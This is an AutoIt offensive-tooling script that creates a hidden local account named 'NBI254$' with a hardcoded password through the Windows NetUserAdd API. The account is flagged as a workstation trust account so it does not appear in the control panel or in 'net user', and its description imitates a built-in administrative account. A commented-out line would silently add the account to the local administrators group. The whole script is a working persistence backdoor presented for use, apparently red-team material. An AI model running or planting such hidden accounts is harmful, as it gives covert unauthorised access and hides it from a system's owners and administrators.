#NoTrayIcon
#Region
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Change2CUI=y
#EndRegion

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Uses the NetUserAdd API to create a new computer/machine account.
    Created user will be hidden in the control panel and from the net user command.

    Adapted from - https://github.com/Ben0xA/DoUCMe
    Credits - Ben0xA (https://twitter.com/Ben0xA)

#ce --------------------------------------------------------------------------------

; Title
ConsoleWrite(@CRLF & "=========== NetUserAdd (computer account) ===========" & @CRLF & @CRLF)

;~ Privilege check
_CheckPrivs()

; Add hidden computer account
_NetUserAdd()

#cs ----------------------------------------------------------------------------

Main functions:
    _CheckPrivs()
    _NetUserAdd()

#ce ----------------------------------------------------------------------------

Func _CheckPrivs()

    ; Just checks if we're admin
    If Not IsAdmin() Then
        ConsoleWrite("[X] You must have administrator privileges." & @CRLF & @CRLF)
        Exit
    EndIf

EndFunc ;==>_CheckPrivs

Func _NetUserAdd()

    ; USER_INFO_1 struct
    ; Adapted from - https://autoit.de/thread/26096-netapi32-dll-netuseradd-problem/
    ; Credits - ProgAndy
    Global Const $tagUSER_INFO_1 = "ptr usri1_name; ptr usri1_password; DWORD usri1_password_age; DWORD usri1_priv; ptr usri1_home_dir; ptr usri1_comment; DWORD usri1_flags; ptr usri1_script_path;"
    Global Const $UF_WORKSTATION_TRUST_ACCOUNT = 0x001000
    Global Const $USER_PRIV_USER = 1

    ; User details
    Global Const $Username = "NBI254$"
    Global Const $Password = "Letmein123!"
    Global Const $Description = "Built-in account for administering the computer/domain"

    ; Create computer account
    ConsoleWrite("[*] Creating local computer account on: " & @ComputerName & @CRLF & @CRLF)

    ; Print username & password
    ConsoleWrite("[+] Username: " & $Username & @CRLF)
    ConsoleWrite("[+] Password: " & $Password & @CRLF & @CRLF)

    ; Set NetUserAdd API parameters
    $tUSER_INFO_1 = DllStructCreate($tagUSER_INFO_1)

    $tName = _Net_WStr_Create($Username)
    DllStructSetData($tUSER_INFO_1, "usri1_name", DllStructGetPtr($tName))

    $tPassword = _Net_WStr_Create($Password)
    DllStructSetData($tUSER_INFO_1, "usri1_password", DllStructGetPtr($tPassword))

    $tComment = _Net_WStr_Create($Description)
    DllStructSetData($tUSER_INFO_1, "usri1_comment", DllStructGetPtr($tComment))

    DllStructSetData($tUSER_INFO_1, "usri1_priv", $USER_PRIV_USER)
    DllStructSetData($tUSER_INFO_1, "usri1_flags", $UF_WORKSTATION_TRUST_ACCOUNT)

    ; NetUserAdd
    $netuseraddCall = DllCall("netapi32.dll", "int", "NetUserAdd", _
        "ptr", 0, _
        "dword", 1, _
        "ptr", DllStructGetPtr($tUSER_INFO_1), _
        "dword", 0)

    If @error Then Return SetError(1, 0, False)
    SetError($netuseraddCall[0], $netuseraddCall[4], $netuseraddCall[0] = 0)

        If @error = 0 Then
            ConsoleWrite("[i] User created successfully." & @CRLF & @CRLF)
            ; Uncomment to add user to local administrators group
            ;RunWait(@ComSpec & " /c net localgroup administrators " & $Username & " /add", "", @SW_HIDE)

        ElseIf @error = 2224 Then
            ConsoleWrite("[X] User " & $Username & " already exists on " & @ComputerName & @CRLF & @CRLF)
        EndIf

    ConsoleWrite("[*] Done." & @CRLF & @CRLF)

EndFunc

#cs ----------------------------------------------------------------------------

Util functions:
    _Net_WStr_Create

#ce ----------------------------------------------------------------------------

Func _Net_WStr_Create($sText)
    Local $tString = DllStructCreate("wchar [" & (StringLen($sText) +1) & "]")
    DllStructSetData($tString, 1, $sText)
    Return $tString
EndFunc
